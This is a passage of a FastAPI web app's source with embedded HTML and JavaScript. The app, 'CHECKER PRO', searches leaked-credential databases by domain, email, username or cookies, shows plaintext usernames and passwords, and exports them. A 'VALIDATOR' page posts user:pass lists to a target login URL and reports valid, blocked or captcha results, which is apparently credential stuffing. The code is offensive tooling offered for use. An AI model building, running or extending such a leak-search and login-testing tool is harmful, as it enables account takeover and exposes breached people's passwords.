        /* EFECTO FUTURISTA EN CAMPO DE ENTRADA */
        @keyframes future-pulse {
            0%, 100% {
                border-color: rgba(57, 255, 20, 0.3);
                background: rgba(17, 24, 39, 0.9);
            }
            50% {
                border-color: #39ff14;
                background: rgba(57, 255, 20, 0.08);
            }
        }

        input[type="text"] {
            animation: future-pulse 1.5s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <!-- NAVBAR -->
    <nav class="navbar">
        <div class="logo">
            CHECKER PRO
        </div>
        <div class="nav-right">
            <button class="btn-validator" onclick="window.location='/validator'">
                ► VALIDATOR
            </button>
        </div>
    </nav>
    
    <!-- MAIN CONTAINER -->
    <div class="container">
        <!-- HERO -->
        <div class="hero">
            <div class="kaomoji" id="kaomoji">〆(・∀・＠)</div>
            <h1 class="slogan" id="slogan">ALREADY LEAKED. ALREADY INDEXED.</h1>
        </div>
        
        <!-- SEARCH SECTION -->
        <div class="search-wrapper">
            <div class="search-form">
                <select class="field-select" id="field-select" onchange="updatePlaceholder()">
                    <option value="domain">◆ DOMAIN</option>
                    <option value="username">◈ USERNAME</option>
                    <option value="email">◊ EMAIL</option>
                    <option value="cookies">◆ COOKIES</option>
                </select>
                
                <select class="match-select" id="match-select" style="display: none;">
                    <option value="exact">EXACT</option>
                    <option value="family" selected>FAMILY</option>
                    <option value="fuzzy">FUZZY</option>
                </select>
                
                <div class="search-input-wrapper">
                    <span class="search-prompt">▶</span>
                    <input type="text" class="search-input" id="search-input" placeholder="ENTER DOMAIN...">
                </div>
                
                <button class="btn-execute" onclick="executeSearch()">
                    ▶ EXECUTE
                </button>
                
                <button class="btn-filters">
                    ◈ FILTERS
                </button>
            </div>
        </div>
        
        <!-- RESULTS -->
        <div class="results-area" id="results">
            <div style="color: #909090; text-align: center; padding: 15px;">NO RESULTS</div>
        </div>
        
        <!-- EXPORT BUTTONS -->
        <div class="export-buttons" id="export-buttons" style="display: none;">
            <button class="btn-export" onclick="exportExcel()">
                ▼ EXCEL
            </button>
            <button class="btn-export" onclick="exportPDF()">
                ▼ PDF
            </button>
            <button class="btn-export" onclick="exportTXT()">
                ▼ TXT
            </button>
        </div>
    </div>
    
    <!-- FOOTER -->
    <div class="footer">
        RECORDS: 12,181,146,288 | STATUS: ONLINE | v1.2.5
    </div>
    
    <script>
        // PAGINACIÓN Y DEDUPLICACIÓN
        let currentResults = [];
        let allFetchedResults = [];
        let seenHashes = new Set();
        let currentOffset = 0;
        let currentLimit = 20;  // Mostrar 20 por página
        let hasMore = false;
        let isLoading = false;
        let lastSearchParams = {};
        let totalCredentials = 0;
        
        // KAOMOJI Y SLOGANS
        const kaomojis = ['〆(・∀・＠)', '(๑•́ ω •̀๑)', '(๑°o°๑)', '(´｀)♡', '٩(◕‿◕｡)۶'];
        const slogans = ['ALREADY LEAKED. ALREADY INDEXED.', 'YOUR DATA. EXPOSED.', 'BREACH INTELLIGENCE PLATFORM', 'THREAT DETECTION MADE EASY', 'SECURITY THROUGH VISIBILITY'];
        
        let sloganIndex = 0;
        
        function initDisplay() {
            document.getElementById('kaomoji').textContent = kaomojis[Math.floor(Math.random() * kaomojis.length)];
            setInterval(() => {
                sloganIndex = (sloganIndex + 1) % slogans.length;
                document.getElementById('slogan').textContent = slogans[sloganIndex];
            }, 6000);
        }
        
        function updatePlaceholder() {
            const field = document.getElementById('field-select').value;
            const placeholders = {
                'domain': 'ENTER DOMAIN (e.g., microsoft.com)...',
                'email': 'ENTER EMAIL (e.g., user@example.com)...',
                'username': 'ENTER USERNAME...',
                'cookies': 'ENTER DOMAIN FOR COOKIES...'
            };
            const matchSelect = document.getElementById('match-select');
            if (['domain', 'cookies'].includes(field)) {
                matchSelect.style.display = 'block';
            } else {
                matchSelect.style.display = 'none';
            }
            document.getElementById('search-input').placeholder = placeholders[field] || 'ENTER...';
        }
        
        // CREAR HASH ÚNICO PARA CADA REGISTRO (DEDUPLICACIÓN)
        function getRecordHash(item) {
            return (item.username || '') + '|' + (item.password || '') + '|' + (item.url || '');
        }
        
        // DISPLAY OSINT RESULTS DINAMICAMENTE
        function displayOSINTResults(data, source) {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = 'result-item';
            div.innerHTML = `
                <div class="result-field">◊ <strong>SOURCE:</strong> ${source}</div>
                <div class="result-field"><strong>DATA:</strong></div>
                <pre style="color: #39ff14; margin: 10px 0; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; max-height: 400px; overflow-y: auto; font-size: 12px;">${JSON.stringify(data, null, 2)}</pre>
            `;
            resultsDiv.appendChild(div);
            document.getElementById('export-buttons').style.display = 'none';
        }
        
        // DISPLAY CREDENTIALS TABLE - TABLA LIMPIA DE CREDENCIALES
        function displayCredentialsTable(credentials, metadata) {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';
            
            if (!credentials || credentials.length === 0) {
                resultsDiv.innerHTML = '<div style="color: #909090; padding: 20px;">NO CREDENTIALS FOUND</div>';
                return;
            }
            
            // Crear tabla simple
            let tableHTML = `
                <div style="overflow-x: auto;">
                    <table style="width: 100%; border-collapse: collapse; color: #39ff14; font-size: 12px;">
                        <thead>
                            <tr style="border-bottom: 1px solid rgba(57, 255, 20, 0.3);">
                                <th style="padding: 8px; text-align: left;">USERNAME</th>
                                <th style="padding: 8px; text-align: left;">PASSWORD</th>
                                <th style="padding: 8px; text-align: left;">EMAIL</th>
                                <th style="padding: 8px; text-align: left;">SOURCE</th>
                                <th style="padding: 8px; text-align: left;">DATE</th>
                            </tr>
                        </thead>
                        <tbody>
            `;
            
            credentials.forEach((cred, idx) => {
                tableHTML += `
                    <tr style="border-bottom: 1px solid rgba(57, 255, 20, 0.1);">
                        <td style="padding: 8px;">${cred.username}</td>
                        <td style="padding: 8px; font-weight: bold;">${cred.password}</td>
                        <td style="padding: 8px;">${cred.email}</td>
                        <td style="padding: 8px;">${cred.source}</td>
                        <td style="padding: 8px;">${cred.date}</td>
                    </tr>
                `;
            });
            
            tableHTML += `
                        </tbody>
                    </table>
                </div>
                <div style="color: #909090; font-size: 11px; padding: 10px; text-align: center;">
                    Showing ${credentials.length} of ${metadata.total_credentials} credentials (${metadata.offset} - ${metadata.offset + credentials.length})
                </div>
            `;
            
            resultsDiv.innerHTML = tableHTML;
            document.getElementById('export-buttons').style.display = 'none';
        }
        
        // LOAD MORE BUTTON PARA DOMAIN-LEAKS
        let currentLeaksOffset = 0;
        let currentLeaksQuery = '';
        
        function showLoadMoreButtonLeaks(query) {
            currentLeaksQuery = query;
            currentLeaksOffset = 20;
            
            let btn = document.getElementById('load-more-btn-leaks');
            if (!btn) {
                btn = document.createElement('button');
                btn.id = 'load-more-btn-leaks';
                btn.className = 'btn-execute';
                btn.style.margin = '20px auto';
                btn.style.display = 'block';
                btn.textContent = '▶ LOAD MORE CREDENTIALS';
                btn.onclick = loadMoreLeaksCredentials;
                const resultsDiv = document.getElementById('results');
                resultsDiv.parentNode.insertBefore(btn, document.getElementById('export-buttons'));
            }
            btn.style.display = 'block';
        }
        
        async function loadMoreLeaksCredentials() {
            if (!currentLeaksQuery) return;
            
            const url = `/api/osint/domain-leaks?query=${encodeURIComponent(currentLeaksQuery)}&offset=${currentLeaksOffset}&limit=20`;
            
            try {
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.credentials && data.credentials.length > 0) {
                    // Agregar credenciales nuevas a la tabla existente
                    appendCredentialsToTable(data.credentials);
                    
                    currentLeaksOffset += 20;
                    
                    // Mostrar/ocultar botón según has_more
                    if (!data.has_more) {
                        document.getElementById('load-more-btn-leaks').style.display = 'none';
                    }
                }
            } catch (error) {
                console.error('Error loading more credentials:', error);
            }
        }
        
        function appendCredentialsToTable(credentials) {
            const table = document.querySelector('table tbody');
            if (!table) return;
            
            credentials.forEach((cred) => {
                const row = document.createElement('tr');
                row.style.borderBottom = '1px solid rgba(57, 255, 20, 0.1)';
                row.innerHTML = `
                    <td style="padding: 8px;">${cred.username}</td>
                    <td style="padding: 8px; font-weight: bold;">${cred.password}</td>
                    <td style="padding: 8px;">${cred.email}</td>
                    <td style="padding: 8px;">${cred.source}</td>
                    <td style="padding: 8px;">${cred.date}</td>
                `;
                table.appendChild(row);
            });
        }
        
        // INICIAR BÚSQUEDA NUEVA
        async function executeSearch() {
            const query = document.getElementById('search-input').value.trim();
            const field = document.getElementById('field-select').value;
            
            if (!query) {
                alert('Enter search term');
                return;
            }
            
            // RESET PAGINACIÓN
            currentOffset = 0;
            allFetchedResults = [];
            seenHashes.clear();
            totalCredentials = 0;
            lastSearchParams = { query, field };
            
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '<div class="loading">▶ SEARCHING...</div>';
            document.getElementById('export-buttons').style.display = 'none';
            hideLoadMoreButton();
            
            try {
                // LLAMAR AL NUEVO ENDPOINT SIMPLE
                const url = `/api/simple-search?field=${encodeURIComponent(field)}&query=${encodeURIComponent(query)}&offset=0&limit=20`;
                
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status !== "ok") {
                    resultsDiv.innerHTML = '<div style="color: #ff4444; text-align: center; padding: 40px;">NO RECORDS FOUND</div>';
                    return;
                }
                
                // GUARDAR METADATA
                totalCredentials = data.total || 0;
                hasMore = data.has_more || false;
                allFetchedResults = data.data || [];
                
                // MOSTRAR RESULTADOS
                if (allFetchedResults.length === 0) {
                    resultsDiv.innerHTML = '<div style="color: #909090; text-align: center; padding: 40px;">NO RECORDS FOUND</div>';
                    document.getElementById('export-buttons').style.display = 'none';
                } else {
                    displayResults(allFetchedResults);
                    document.getElementById('export-buttons').style.display = 'flex';
                    
                    // MOSTRAR BOTÓN SI HAY MÁS
                    if (hasMore) {
                        showLoadMoreButton();
                    }
                }
            } catch (error) {
                resultsDiv.innerHTML = '<div style="color: #ff4444; padding: 20px;">ERROR: ' + error.message + '</div>';
            }
        }
        
        // MOSTRAR MÁS RESULTADOS
        async function loadMoreResults() {
            if (isLoading) return;
            isLoading = true;
            
            try {
                const { query, field } = lastSearchParams;
                const nextOffset = allFetchedResults.length;
                
                console.log(`[LOAD MORE] Fetching from offset ${nextOffset}, limit=20`);
                
                // FETCH SIGUIENTES 20 RESULTADOS
                const url = `/api/simple-search?field=${encodeURIComponent(field)}&query=${encodeURIComponent(query)}&offset=${nextOffset}&limit=20`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === "ok") {
                    // AGREGAR NUEVOS RESULTADOS
                    allFetchedResults = allFetchedResults.concat(data.data || []);
                    
                    // ACTUALIZAR has_more
                    hasMore = data.has_more || false;
                    
                    // MOSTRAR TODOS LOS RESULTADOS CARGADOS HASTA AHORA
                    displayResults(allFetchedResults);
                    
                    // ACTUALIZAR BOTÓN
                    if (hasMore) {
                        showLoadMoreButton();
                    } else {
                        hideLoadMoreButton();
                    }
                }
                
                isLoading = false;
            } catch (error) {
                console.error('Error loading more:', error);
                isLoading = false;
            }
        }
        
        function showLoadMoreButton() {
            let btn = document.getElementById('load-more-btn');
            if (!btn) {
                btn = document.createElement('button');
                btn.id = 'load-more-btn';
                btn.className = 'btn-execute';
                btn.style.margin = '20px auto';
                btn.style.display = 'block';
                btn.textContent = '▶ LOAD MORE RESULTS';
                btn.onclick = loadMoreResults;
                const resultsDiv = document.getElementById('results');
                resultsDiv.parentNode.insertBefore(btn, document.getElementById('export-buttons'));
            }
            btn.style.display = 'block';
        }
        
        function hideLoadMoreButton() {
            const btn = document.getElementById('load-more-btn');
            if (btn) btn.style.display = 'none';
        }
        
        function displayResults(results) {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';
            
            results.forEach((item, idx) => {
                const div = document.createElement('div');
                div.className = 'result-item';
                div.innerHTML = `
                    <div style="font-size: 16px; font-weight: bold; color: #00ff41; margin-bottom: 8px; text-shadow: 0 0 10px rgba(57, 255, 20, 0.8);">▶ ${idx + 1}</div>
                    <div class="result-field"><strong>USER:</strong> ${item.username || 'N/A'}</div>
                    <div class="result-field"><strong>PASS:</strong> ${item.password || 'N/A'}</div>
                    <div class="result-field"><strong>URL:</strong> ${item.url || 'N/A'}</div>
                `;
                resultsDiv.appendChild(div);
            });
            
            // AGREGAR CONTADOR AL FINAL - Mostrar cuántos se están mostrando actualmente
            const counterDiv = document.createElement('div');
            counterDiv.style.color = '#39ff14';
            counterDiv.style.textAlign = 'center';
            counterDiv.style.padding = '16px';
            counterDiv.style.fontSize = '13px';
            counterDiv.style.borderTop = '2px solid rgba(57, 255, 20, 0.4)';
            counterDiv.style.marginTop = '15px';
            counterDiv.style.fontWeight = 'bold';
            counterDiv.style.backgroundColor = 'rgba(57, 255, 20, 0.1)';
            counterDiv.style.borderRadius = '4px';
            counterDiv.style.boxShadow = '0 0 15px rgba(57, 255, 20, 0.3)';
            counterDiv.style.textShadow = '0 0 8px rgba(57, 255, 20, 0.6)';
            counterDiv.innerHTML = `▼ Showing ${results.length} credentials`;
            resultsDiv.appendChild(counterDiv);
        }
        
        async function exportExcel() {
            fetch('/api/export/excel', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({results: allFetchedResults})
            }).then(r => r.blob()).then(b => {
                const url = URL.createObjectURL(b);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'checker_results.xlsx';
                a.click();
            });
        }
        
        async function exportPDF() {
            fetch('/api/export/pdf', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({results: allFetchedResults})
            }).then(r => r.blob()).then(b => {
                const url = URL.createObjectURL(b);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'checker_results.pdf';
                a.click();
            });
        }
        
        async function exportTXT() {
            fetch('/api/export/txt', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({results: allFetchedResults})
            }).then(r => r.blob()).then(b => {
                const url = URL.createObjectURL(b);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'checker_results.txt';
                a.click();
            });
        }
        
        document.addEventListener('DOMContentLoaded', initDisplay);
    </script>
</body>
</html>
"""

@app.get("/validator", response_class=HTMLResponse)
async def validator_page():
    return """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDATOR - Credential Validation</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%230f0f1e'/%3E%3Ccircle cx='50' cy='50' r='45' fill='none' stroke='%2339ff14' stroke-width='2'/%3E%3Ctext x='50' y='75' font-size='80' font-weight='bold' font-family='Arial,sans-serif' fill='%2339ff14' text-anchor='middle' style='filter:drop-shadow(0 0 6px %2339ff14);'%3EC%3C/text%3E%3C/svg%3E" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        
        .navbar {
            background: rgba(20, 20, 35, 0.95);
            backdrop-filter: blur(10px);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            border-bottom: 2px solid rgba(57, 255, 20, 0.3);
            border-radius: 4px;
        }
        
        .logo {
            font-size: 18px;
            font-weight: bold;
            color: #39ff14;
        }
        
        .nav-links a {
            color: #39ff14;
            text-decoration: none;
            margin: 0 15px;
            font-size: 12px;
            transition: all 0.3s;
        }
        
        .nav-links a:hover {
            text-shadow: 0 0 10px #39ff14;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: rgba(17, 24, 39, 0.9);
            padding: 40px;
            border-radius: 8px;
            border: 1px solid rgba(57, 255, 20, 0.3);
            box-shadow: 0 0 30px rgba(57, 255, 20, 0.1);
        }
        
        h1 {
            color: #39ff14;
            margin-bottom: 10px;
            font-size: 24px;
            text-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }
        
        .subtitle {
            color: #909090;
            font-size: 12px;
            margin-bottom: 30px;
            font-style: italic;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #39ff14;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(57, 255, 20, 0.3);
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: rgba(30, 30, 45, 0.8);
            color: #39ff14;
            transition: all 0.3s;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #39ff14;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
            background: rgba(30, 30, 45, 1);
        }
        
        input::placeholder, textarea::placeholder {
            color: rgba(57, 255, 20, 0.4);
        }
        
        textarea {
            min-height: 120px;
            resize: vertical;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            background: rgba(57, 255, 20, 0.2);
            border: 1px solid #39ff14;
            color: #39ff14;
            padding: 12px 30px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #39ff14;
            color: #0f0f1e;
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.6);
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .validation-results {
            margin-top: 40px;
            padding: 20px;
            background: rgba(57, 255, 20, 0.05);
            border: 1px solid rgba(57, 255, 20, 0.2);
            border-radius: 4px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .results-header {
            color: #39ff14;
            font-weight: bold;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(57, 255, 20, 0.2);
            font-size: 11px;
        }
        
        .result-item {
            padding: 10px;
            margin-bottom: 10px;
            border-left: 3px solid;
            border-radius: 2px;
            font-size: 11px;
            animation: slideIn 0.4s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .result-valid {
            background: rgba(34, 197, 94, 0.1);
            border-color: #22c55e;
            color: #22c55e;
        }
        
        .result-invalid {
            background: rgba(239, 68, 68, 0.1);
            border-color: #ef4444;
            color: #ef4444;
        }
        
        .result-blocked {
            background: rgba(245, 158, 11, 0.1);
            border-color: #f59e0b;
            color: #f59e0b;
        }
        
        .result-captcha {
            background: rgba(245, 158, 11, 0.1);
            border-color: #f59e0b;
            color: #f59e0b;
        }
        
        .result-item strong {
            color: #39ff14;
        }
        
        .loading {
            text-align: center;
            color: #39ff14;
            padding: 40px;
            font-size: 12px;
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(57, 255, 20, 0.3);
            border-top: 2px solid #39ff14;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            color: #ef4444;
            padding: 15px;
            border-radius: 4px;
            margin-top: 10px;
            font-size: 12px;
        }
        
        .success-summary {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid #22c55e;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            color: #22c55e;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">► VALIDATOR PRO</div>
        <div class="nav-links">
            <a href="/">🔍 SEARCH</a>
            <a href="/validator">🔐 VALIDATOR</a>
        </div>
    </div>
    
    <div class="container">
        <h1>🔐 CREDENTIAL VALIDATOR</h1>
        <div class="subtitle">Real Browser Testing & Validation</div>
        
        <div class="form-group">
            <label>◆ Target URL:</label>
            <input type="text" id="val-url" placeholder="https://example.com/login">
        </div>
        
        <div class="form-group">
            <label>◈ Credentials (user:pass format, one per line):</label>
            <textarea id="val-creds" placeholder="admin:password123&#10;user:pass456&#10;test:testing"></textarea>
        </div>
        
        <div class="form-group">
            <label>📝 Username Field (optional, leave blank for auto-detect):</label>
            <input type="text" id="val-user-field" placeholder="username or id">
        </div>
        
        <div class="form-group">
            <label>🔑 Password Field (optional, leave blank for auto-detect):</label>
            <input type="text" id="val-pass-field" placeholder="password or pwd">
        </div>
        
        <div class="button-group">
            <button class="btn" onclick="validate()">▼ VALIDATE CREDENTIALS</button>
            <button class="btn" onclick="clearForm()">✕ CLEAR ALL</button>
            <button class="btn" onclick="window.location='/osint'" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">🔍 OSINT SEARCH</button>
        </div>
        
        <div class="validation-results" id="val-results"></div>
    </div>
    
    <script>
        let isValidating = false;
        
        function clearForm() {
            document.getElementById('val-url').value = '';
            document.getElementById('val-creds').value = '';
            document.getElementById('val-user-field').value = '';
            document.getElementById('val-pass-field').value = '';
            document.getElementById('val-results').innerHTML = '';
        }
        
        async function validate() {
            if (isValidating) return;
            
            const url = document.getElementById('val-url').value.trim();
            const credsText = document.getElementById('val-creds').value.trim();
            const userField = document.getElementById('val-user-field').value.trim() || null;
            const passField = document.getElementById('val-pass-field').value.trim() || null;
            
            if (!url) {
                alert('❌ Enter a target URL');
                return;
            }
            
            if (!credsText) {
                alert('❌ Enter credentials (user:pass format)');
                return;
            }
            
            const creds = credsText.split('\\n').map(line => {
                const [user, pass] = line.trim().split(':');
                return {username: user?.trim(), password: pass?.trim()};
            }).filter(c => c.username && c.password);
            
            if (creds.length === 0) {
                alert('❌ Invalid format. Use: user:pass (one per line)');
                return;
            }
            
            isValidating = true;
            const valDiv = document.getElementById('val-results');
            valDiv.innerHTML = `<div class="loading"><div class="spinner"></div>Testing ${creds.length} credential(s)...</div>`;
            
            try {
                const response = await fetch('/api/validate-credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        url: url,
                        credentials: creds,
                        username_field: userField,
                        password_field: passField
                    })
                });
                
                const data = await response.json();
                
                let html = `<div class="results-header">`;
                html += `▼ Tested: ${data.total || 0} | `;
                html += `<span style="color: #22c55e;">▼ Valid: ${data.valid || 0}</span> | `;
                html += `<span style="color: #ef4444;">✗ Invalid: ${data.invalid || 0}</span>`;
                if (data.blocked) {
                    html += ` | <span style="color: #f59e0b;">🔒 Blocked: ${data.blocked}</span>`;
                }
                html += `</div>`;
                
                if (data.valid && data.valid > 0) {
                    html = `<div class="success-summary">✓ ${data.valid} credential(s) are VALID! 🎯</div>` + html;
                }
                
                if (data.results && data.results.length > 0) {
                    data.results.forEach((r, idx) => {
                        let cssClass = 'result-invalid';
                        let icon = '✗';
                        let statusText = 'INVALID';
                        let statusColor = '#ef4444';
                        
                        if (r.state === 'valid') {
                            cssClass = 'result-valid';
                            icon = '✓';
                            statusText = 'VALID';
                            statusColor = '#22c55e';
                        } else if (r.state === 'blocked') {
                            cssClass = 'result-blocked';
                            icon = '🔒';
                            statusText = 'BLOCKED';
                            statusColor = '#f59e0b';
                        } else if (r.state === 'captcha') {
                            cssClass = 'result-captcha';
                            icon = '⚠️';
                            statusText = 'CAPTCHA';
                            statusColor = '#f59e0b';
                        } else if (r.state === 'not_found') {
                            icon = '?';
                            statusText = 'FIELDS NOT FOUND';
                        } else if (r.state === 'offline') {
                            icon = '🌐';
                            statusText = 'OFFLINE/TIMEOUT';
                        }
                        
                        let item = `<div class="result-item ${cssClass}">`;
                        item += `${icon} <strong>#${idx+1}</strong> ${r.username}:${r.password} `;
                        item += `| <span style="color: ${statusColor}; font-weight: bold;">${statusText}</span> `;
                        item += `| ${r.response_time}ms`;
                        
                        if (r.url_final) {
                            item += ` | Final: ${r.url_final.substring(0, 40)}...`;
                        }
                        
                        if (r.error) {
                            item += ` | ⚠️ ${r.error}`;
                        }
                        item += `</div>`;
                        html += item;
                    });
                }
                
                valDiv.innerHTML = html;
            } catch (error) {
                valDiv.innerHTML = `<div class="error-message">❌ Error: ${error.message}</div>`;
            } finally {
                isValidating = false;
            }
        }
    </script>
</body>
</html>
"""

@app.get("/api/status")
async def status():
    return {"status": "online", "version": "2.0"}

@app.get("/api/search/domain")
async def search_domain(domain: str, limit: int = 50, match_mode: str = "family", offset: int = 0):
    """Buscar por dominio usando Leaksyr API real"""
    if not leaksyr_client:
        raise HTTPException(status_code=500, detail="Leaksyr API not initialized")
    
    try:
        response = leaksyr_client.search_domain(
            domain=domain,
            limit=min(limit, 100),
            match_mode=match_mode,
            offset=offset
        )
        # Convertir SearchResponse a dict
        return {
            "status": "ok",
            "data": response.data,
            "count": response.meta.count,
            "meta": {
                "query": response.meta.query,
                "limit": response.meta.limit,
                "offset": response.meta.offset,
                "has_more": response.meta.has_more
            }
        }
    except Exception as e:
        print(f"Error en search_domain: {e}")
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/search/email")
async def search_email(email: str, limit: int = 50, offset: int = 0):
    """Buscar por email usando Leaksyr API real"""
    if not leaksyr_client:
        raise HTTPException(status_code=500, detail="Leaksyr API not initialized")
    
    try:
        response = leaksyr_client.search_email(
            email=email,
            limit=min(limit, 100),
            offset=offset
        )
        return {
            "status": "ok",
            "data": response.data,
            "count": response.meta.count,
            "meta": {
                "query": response.meta.query,
                "limit": response.meta.limit,
                "offset": response.meta.offset,
                "has_more": response.meta.has_more
            }
        }
    except Exception as e:
        print(f"Error en search_email: {e}")
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/search/username")
async def search_username(username: str, limit: int = 50, offset: int = 0):
    """Buscar por usuario usando Leaksyr API real"""
    if not leaksyr_client:
        raise HTTPException(status_code=500, detail="Leaksyr API not initialized")
    
    try:
        response = leaksyr_client.search_username(
            username=username,
            limit=min(limit, 100),
            offset=offset
        )
        return {
            "status": "ok",
            "data": response.data,
            "count": response.meta.count,
            "meta": {
                "query": response.meta.query,
                "limit": response.meta.limit,
                "offset": response.meta.offset,
                "has_more": response.meta.has_more
            }
        }
    except Exception as e:
        print(f"Error en search_username: {e}")
        raise HTTPException(status_code=400, detail=str(e))

# ============ OSINT ENDPOINTS ============

@app.get("/api/osint/breach-check")
async def osint_breach_check(email: str):
    """Check if email is in public breaches (HIBP)"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.check_hibp_breach(email)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/url-reputation")
async def osint_url_check(url: str):
    """Check if URL is malicious (URLhaus)"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.check_url_reputation(url)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/domain-reputation")
async def osint_domain_check(domain: str):
    """Check domain reputation from multiple sources"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.check_domain_reputation(domain)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/ip-reputation")
async def osint_ip_check(ip: str):
    """Check IP reputation and geolocation"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.check_ip_reputation(ip)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/username-search")
async def osint_username_search(username: str):
    """Search username across platforms"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_username_osint(username)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/email-search")
async def osint_email_search(email: str):
    """Search email across OSINT sources"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_email_osint(email)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/hash-lookup")
async def osint_hash_lookup(hash_value: str):
    """Lookup hash in known compromised databases"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.check_hash(hash_value)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

# ============ NEW OSINT ENDPOINTS ============

@app.get("/api/osint/search-exploits")
async def osint_search_exploits(query: str):
    """Search for exploits and vulnerabilities"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_exploits(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/pastebin-search")
async def osint_pastebin_search(query: str):
    """Search Pastebin for leaked data"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_pastebin(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/phone-search")
async def osint_phone_search(phone: str):
    """Search phone number across OSINT sources"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_phone_osint(phone)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/company-search")
async def osint_company_search(company: str, domain: str = None):
    """Search for company information"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
